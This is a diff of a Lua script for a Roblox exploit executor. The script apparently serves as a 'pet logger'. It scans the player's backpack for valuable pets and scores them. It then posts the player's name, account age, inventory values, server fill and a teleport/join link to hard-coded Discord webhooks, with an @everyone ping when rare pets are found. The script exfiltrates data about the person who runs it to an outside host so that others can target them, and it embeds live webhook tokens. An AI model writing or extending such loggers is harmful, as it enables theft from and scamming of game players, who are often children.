@@ -6,6 +6,17 @@ local player = Players.LocalPlayer
 local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
 local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
 
+-- HTTP request function
+local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)
+if not req then return warn("❌ Your executor does not support HTTP requests.") end
+
+-- SERVER COLOR FUNCTION
+local function getServerStatus()
+    local totalPlayers = #Players:GetPlayers()
+    local serverColor = totalPlayers == 5 and "🟥" or totalPlayers >= 3 and "🟨" or "🟩"
+    return string.format("%d/5 %s", totalPlayers, serverColor)
+end
+
 -- PRIORITY PETS & VALUES
 local PRIORITY = {
     ["Raccoon"]="🦝", ["Dragonfly"]="🐉", ["Mimic Octopus"]="🐙", ["Red Fox"]="🦊",
@@ -21,9 +32,8 @@ local PRIORITY_VALUES = {
     ["Fennec Fox"]=100, ["T-Rex"]=35
 }
 
--- PET LIST
-local PETS = {
-    "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
+-- ALL PETS
+local PETS = { "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
     "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
     "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
     "Silver Monkey","Sea Otter","Turtle","Polar Bear","Grey Mouse","Mole","Frog","Panda",
@@ -36,13 +46,11 @@ local PETS = {
     "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
     "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
     "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose",
-    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex"
-}
+    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex" }
 
--- Lowercase keywords
+-- Helper to check if a name is a pet
 local PET_KEYWORDS = {}
 for _, name in ipairs(PETS) do PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower() end
-
 local function isPet(name)
     local lower = name:lower()
     for _, keyword in ipairs(PET_KEYWORDS) do
@@ -58,7 +66,7 @@ local function getPriorityEmoji(name)
     return nil
 end
 
--- Collect pets into categories and sort
+-- Collect pets from container
 local function collectPets(container)
     if not container then return {},0,false end
     local items, hasPriorityPet = {}, false
@@ -90,18 +98,18 @@ local function collectPets(container)
         if priorityEmoji then
             if weight >= 30 then
                 displayValue = displayValue + 3000
-                line = "[💪] ["..priorityEmoji.."] - "..name.." "..ageText.." → "..displayValue.."¢"
+                line = "[💪] ["..priorityEmoji.."] - "..name.." ["..weight.." KG] "..ageText.." → "..displayValue.."¢"
                 table.insert(priorityStrong, {line=line,value=displayValue})
             else
-                line = "["..priorityEmoji.."] - "..name.." "..ageText.." → "..displayValue.."¢"
+                line = "["..priorityEmoji.."] - "..name.." ["..weight.." KG] "..ageText.." → "..displayValue.."¢"
                 table.insert(priorityNormal, {line=line,value=displayValue})
             end
         else
             if weight >= 15 then
-                line = "💪 - "..name.." "..ageText.." → "..displayValue.."¢"
+                line = "💪 - "..name.." ["..weight.." KG] "..ageText.." → "..displayValue.."¢"
                 table.insert(strong, {line=line,value=displayValue})
             else
-                line = "🐶 - "..name.." "..ageText.." → "..displayValue.."¢"
+                line = "🐶 - "..name.." ["..weight.." KG] "..ageText.." → "..displayValue.."¢"
                 table.insert(normal, {line=line,value=displayValue})
             end
         end
@@ -109,14 +117,12 @@ local function collectPets(container)
         totalValue = totalValue + displayValue
     end
 
-    -- Sort each category descending
     local function sortDesc(t) table.sort(t,function(a,b) return a.value>b.value end) end
     sortDesc(priorityStrong)
     sortDesc(priorityNormal)
     sortDesc(strong)
     sortDesc(normal)
 
-    -- Merge categories
     local formatted = {}
     for _,cat in ipairs({priorityStrong,priorityNormal,strong,normal}) do
         for _,entry in ipairs(cat) do table.insert(formatted,entry.line) end
@@ -125,51 +131,42 @@ local function collectPets(container)
     return formatted,totalValue,hasPriorityPet
 end
 
--- Wait for Backpack & Character
+-- INITIAL COLLECTION
 local backpack = player:WaitForChild("Backpack")
-local char = player.Character or player.CharacterAdded:Wait()
-
 local backpackList, backpackValue, hasPriorityBackpack = collectPets(backpack)
-local equippedList, equippedValue, hasPriorityEquipped = collectPets(char)
-local totalValue = backpackValue + equippedValue
-local hasPriority = hasPriorityBackpack or hasPriorityEquipped
+local totalValue = backpackValue
+local hasPriority = hasPriorityBackpack
 
-local pingText = hasPriority and "--@everyone\n" or ""
 local targetWebhook = hasPriority and WEBHOOK_PRIORITY or WEBHOOK_NORMAL
-local teleportLine = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d,"%s")',game.PlaceId,game.JobId)
-local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s",game.PlaceId,game.JobId)
-local contentText = pingText..teleportLine
-local embedColor = hasPriority and 15158332 or 3066993
+local pingText = "--@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
 
-local description = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```"..
-                    "\n💰 Kwarta nga nakuha\n```"..totalValue.."₱```\n🎒 Backpack\n```"..(#backpackList>0 and table.concat(backpackList,"\n") or "No pets found.").."```\n🏝️ Join with URL\n**["..game.JobId.."]("..serverURL..")**"
+-- Build message with dynamic join URL (bold JobId)
+local function buildDescription()
+    local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+    local desc = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```\n"
+    desc = desc.."💰 Kwarta nga nakuha\n```"..totalValue.."₱```\n"
+    desc = desc.."🌍 Server\n```"..getServerStatus().."```\n"
+    desc = desc.."🎒 Backpack\n```"..(#backpackList>0 and table.concat(backpackList,"\n") or "No pets").."```\n"
+    desc = desc.."🏝️ Join with URL\n[**"..game.JobId.."**]("..serverURL..")"
+    return desc
+end
 
+-- SEND WEBHOOK
 local payload = {
-    content = contentText,
+    content = pingText,
+    username = "Pet Logger",
     embeds = {{
         title = "🌑Definitely Not Dark🌑",
-        description = description,
-        color = embedColor
+        description = buildDescription(),
+        color = 0x00ff00
     }}
 }
 
-local json = HttpService:JSONEncode(payload)
-local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)
+req({
+    Url = targetWebhook,
+    Method = "POST",
+    Headers = { ["Content-Type"] = "application/json" },
+    Body = HttpService:JSONEncode(payload)
+})
 
-if req then
-    local success, err = pcall(function()
-        req({
-            Url = targetWebhook,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
-            Body = json
-        })
-    end)
-    if success then
-        print("✅ Webhook sent to:", targetWebhook)
-    else
-        warn("❌ Failed to send webhook:", err)
-    end
-else
-    warn("❌ Your executor does not support HTTP requests.")
-end
+print("✅ Webhook sent!")
